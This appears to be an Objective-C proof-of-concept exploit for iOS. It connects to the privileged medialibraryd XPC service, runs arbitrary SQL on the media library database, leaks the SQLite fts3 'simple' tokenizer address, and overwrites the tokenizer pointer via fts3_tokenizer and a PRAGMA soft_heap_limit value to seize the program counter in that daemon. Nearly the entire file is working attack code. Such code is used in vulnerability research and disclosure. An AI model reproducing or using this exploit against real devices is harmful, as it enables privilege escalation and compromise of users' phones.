#import "poc.h"

#ifdef __LP64__
typedef struct mach_header_64 mach_header_t;
typedef struct segment_command_64 segment_command_t;
typedef struct section_64 section_t;
typedef struct nlist_64 nlist_t;
#define LC_SEGMENT_ARCH_DEPENDENT LC_SEGMENT_64
#else
#error Sorry, only 64-bit
#endif

#define MAGIC_SEARCH 0x00414243deadbeef
#define STR_HELPER(x) #x
#define STR(x) STR_HELPER(x)

void *get_local_simple_addr() {
    sqlite3 *db;
    int rc;

    rc = sqlite3_open(":memory:", &db);
    assert(rc == SQLITE_OK);

    rc = sqlite3_exec(db, "PRAGMA soft_heap_limit=" STR(MAGIC_SEARCH), NULL, NULL, NULL);
    assert(rc == SQLITE_OK);

    sqlite3_stmt *statement;
    sqlite3_prepare_v2(db, "SELECT fts3_tokenizer('simple');", -1, &statement, 0);
    rc = sqlite3_step(statement);
    assert(rc == SQLITE_ROW);

    const void *blob = sqlite3_column_blob(statement, 0);
    size_t len = sqlite3_column_bytes(statement, 0);
    sqlite3_close(db);

    assert(len == sizeof(long long));
    long long value = *(long long *)blob;
    return (void *)CFSwapInt64LittleToHost(value);
}

void *search_heap_limit() {
    uint32_t count = _dyld_image_count();
    intptr_t slide = 0;
    const struct mach_header *mh = NULL;
    for (uint32_t i = 0; i < count; i++) {
        const char *name = _dyld_get_image_name(i);
        if (strcmp(name, "/usr/lib/libsqlite3.dylib") == 0) {
            mh = _dyld_get_image_header(i);
            slide = _dyld_get_image_vmaddr_slide(i);
            break;
        }
    }

    assert(mh);
    assert(mh->magic == MH_MAGIC_64);

    uint64_t magic = MAGIC_SEARCH;
    uintptr_t cmd = (uintptr_t)mh + sizeof(mach_header_t);
    for (uint i = 0; i < mh->ncmds; i++) {
        segment_command_t *seg = (segment_command_t *)cmd;
        if (seg->cmd == LC_SEGMENT_64 && strcmp(seg->segname, SEG_DATA) == 0) {
            for (uint j = 0; j < seg->nsects; j++) {
                section_t *sect = (section_t *)(cmd + sizeof(segment_command_t)) + j;
                if (strcmp(sect->sectname, SECT_BSS) == 0) {
                    void *begin = (void *)(sect->addr + slide);
                    return memmem(begin, sect->size, &magic, sizeof(magic));
                }
            }
        }
        cmd += seg->cmdsize;
    }

    abort();
}

id get_xpc_conn_proxy() {
    NSString *MLMediaLibraryServiceMachServiceName = @"com.apple.medialibraryd.xpc";
    NSXPCConnection *conn = [NSXPCConnection alloc];
    SEL sel = NSSelectorFromString(@"initWithMachServiceName:options:");
    IMP imp = [conn methodForSelector:sel];
    void (*initWithNameAndOpt)(id, SEL, NSString *, NSNumber *) = (void *)imp;
    initWithNameAndOpt(conn, sel, MLMediaLibraryServiceMachServiceName,
                       [NSNumber numberWithInt:NSXPCConnectionPrivileged]);
    conn.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(MLMediaLibraryServiceProtocol)];
    [conn resume];
    return [conn remoteObjectProxy];
}

NSError *pc_control(uintptr_t offset, uintptr_t pc) {
    id remote = get_xpc_conn_proxy();

    dispatch_semaphore_t wait_for = dispatch_semaphore_create(0);
#define WAIT dispatch_semaphore_wait(wait_for, dispatch_time(DISPATCH_TIME_NOW, 2ull * NSEC_PER_SEC))
#define PASS dispatch_semaphore_signal(wait_for)

    // It's a logic bug that you can modify arbitrary SQLite database, it could have much more ways to exploit

    NSString *path = @"/var/mobile/Media/iTunes_Control/iTunes/MediaLibrary.sqlitedb";    
    __block NSError *failure = nil;

#define SET_ERR failure = err;
#define CHECK_FAILURE(...)                                                                                             \
    if (failure) {                                                                                                     \
        NSLog(__VA_ARGS__);                                                                                            \
        return failure;                                                                                                \
    }                                                                                                                  \
    failure = nil;
    

    __block NSUUID *uuid = nil;
    [remote beginTransactionForDatabaseAtPath:path
                            withPriorityLevel:0
                                      options:1
                            completionHandler:^(NSUUID *transaction, NSError *err) {
                              SET_ERR;
                              uuid = transaction;
                              PASS;
                            }];
    WAIT;

    CHECK_FAILURE(@"failed to open database at %@", path);

    __block long long remote_simple;
    [remote executeQuery:@"select (fts3_tokenizer('simple'))"
               withParameters:nil
                      options:nil
                onTransaction:uuid
        withCompletionHandler:^(NSData *data, NSError *err) {
          SET_ERR;

          if (err)
              return;
          NSMutableArray *results = [NSKeyedUnarchiver unarchiveObjectWithData:data];
          // only 64bit now
          long long raw;
          [results[0][0] getBytes:&raw length:sizeof(raw)];
          remote_simple = CFSwapInt64LittleToHost(raw);
          PASS;
        }];

    WAIT;

    NSLog(@"leaked addr: 0x%llx", remote_simple);

    void (^remoteQuery)(NSString *) = ^(NSString *sql) {
      [remote executeQuery:sql
                 withParameters:nil
                        options:nil
                  onTransaction:uuid
          withCompletionHandler:^(NSData *data, NSError *err) {
            SET_ERR;
            PASS;
          }];
      WAIT;
    };

    NSString *sql_set_new_limit = [NSString stringWithFormat:@"PRAGMA soft_heap_limit=0x%016lx;", pc];
    NSLog(@"%@", sql_set_new_limit);
    remoteQuery(sql_set_new_limit);
    CHECK_FAILURE(@"failed to set new simple handler");

    long long remote_stage = remote_simple + offset - 8;
    NSString *sql_set_tokenizer =
        [NSString stringWithFormat:@"select fts3_tokenizer('simple', x'%016llx')", CFSwapInt64BigToHost(remote_stage)];
    NSLog(@"stage2: %@", sql_set_tokenizer);
    remoteQuery(sql_set_tokenizer);

    CHECK_FAILURE(@"failed to update simple handler");
    remoteQuery(@"drop table if exists a;");

    CHECK_FAILURE(@"failed to drop table");

    remoteQuery(@"create virtual table a using fts3;");
    CHECK_FAILURE(@"failed to trigger");

    return nil;
}

NSError *poc() {
    void *local_simple = get_local_simple_addr();
    void *heap_limit = search_heap_limit();
    uintptr_t offset = heap_limit - local_simple;
    // Exception Type:  EXC_BAD_ACCESS (SIGBUS)
    // Exception Subtype: EXC_ARM_DA_ALIGN at 0x00200000deadbeef -> 0x00000000deadbeef (possible pointer authentication failure)
    return pc_control(offset, 0xdeadbeef);
}
